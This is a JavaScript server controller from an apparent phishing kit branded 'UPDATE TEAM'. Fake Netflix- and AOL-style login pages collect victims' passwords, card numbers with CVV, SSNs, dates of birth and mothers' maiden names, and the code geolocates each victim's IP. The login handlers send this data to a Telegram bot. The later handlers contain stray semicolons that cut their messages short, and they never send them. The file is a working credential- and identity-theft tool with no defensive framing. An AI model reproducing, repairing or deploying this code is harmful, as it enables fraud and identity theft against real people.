const { sendMessageFor } = require("simple-telegram-message");
const ipInfo = require("ip-info-finder");
const { getClientIp } = require("request-ip");
const { botToken, chatId } = require("../../settings");
const axios = require('axios');
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;



exports.login = (req, res) => {
	return res.render("login");
};

exports.loginPost = async (req, res) => {
	const { userId, password } = req.body;

	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    // Move the console.log statement outside the sendAPIRequest function
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


    const message =
        `✅ UPDATE TEAM | NETFL1X | USER_${ipAddress}\n\n` +
        `👤 EMAIL ADDRESS\n` +
		`EMAIL/PHONE      : ${userId}\n` +
		`PASSWORD         : ${password}\n\n` + 
        `🌍 GEO-IP INFO\n` +
        `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
        `CITY             : ${ipAddressInformation.location.city}\n` +
        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
        `💻 SYSTEM INFO\n` +
        `USER AGENT       : ${userAgent}\n` +
        `SYSTEM LANGUAGE  : ${systemLang}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

    const sendMessage = sendMessageFor(botToken, chatId);
    sendMessage(message);

	console.log(message);

    res.redirect("/auth/login/2");

} catch (error) {
	// Handle any unexpected errors here
	console.error('Unexpected error:', error.message);
	res.status(500).send('Internal Server Error');
}
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Handle the rejection
});

	
};


exports.login2 = (req, res) => {
	return res.render("login2");
};

exports.loginPost2 = async (req, res) => {
	const { userId, password } = req.body;

	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


        const message =
            `✅ UPDATE TEAM | A0L | USER_${ipAddress}\n\n` +
            `👤 RELOGIN INFO\n` +
			`EMAIL/PHONE      : ${userId}\n` +
			`PASSWORD         : ${password}\n\n` +
            
            `🌍 GEO-IP INFO\n` +
           `IP ADDRESS       : ${ipAddress}\n` +
            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
            `💬 Telegram: https://t.me/UpdateTeams\n` +
            `🌐 Website: Coming soon!!\n`;

        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
        sendMessage(message);

        res.redirect("/auth/login/3");
    } catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};




exports.login3 = (req, res) => {
	res.render("login3");
};

exports.loginPost3 = async (req, res) => {
	const { fullName, address, city, state, zip, country, phoneNum, cardNum, expDate, cvv } = req.body;
	
const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];

	const message =
		`✅ UPDATE TEAM | NETFL1X | USER_${ipAddress}\n\n` +
		`👤 BILLING INFO\n` +
		`FULL NAME        : ${fullName}\n` +
		`STREET ADDRESS   : ${address}\n` +
		`CITY             : ${city}\n` +
		`STATE            : ${state}\n` +
		`ZIP CODE         : ${zip}\n` +
		`COUNTRY          : ${country}\n` +
		`PHONE NUMBER     : ${phoneNum}\n` +
		`CARD NUMBER      : ${cardNum}\n` +
		`EXPIRY DATE      : ${expDate}\n` +
		`CVV              : ${cvv}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		 `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
		`💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;
		
		res.redirect("/auth/login/4");
		
	} catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.login4 = (req, res) => {
	return res.render("login4");
};

exports.loginPost4 = async (req, res) => {
	const { dob, ssn, mmn } = req.body;

	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
	const message =
		`✅ UPDATE TEAM | NETFL1X | USER_${ipAddress}\n\n` +
		`👤 PERSONAL INFO\n` +
		`DOB              : ${dob}\n` +
		`SSN              : ${ssn}\n` +
		`MMN              : ${mmn}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		 `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
		`💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;
		
		res.redirect("/auth/complete");

	} catch (error) {
		// Handle any unexpected errors here
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
		// Handle the rejection
	});
	
};

exports.complete = (req, res) => {
	return res.render("complete");
};

exports.page404Redirect = (req, res) => {
	return res.redirect("/auth/login");
};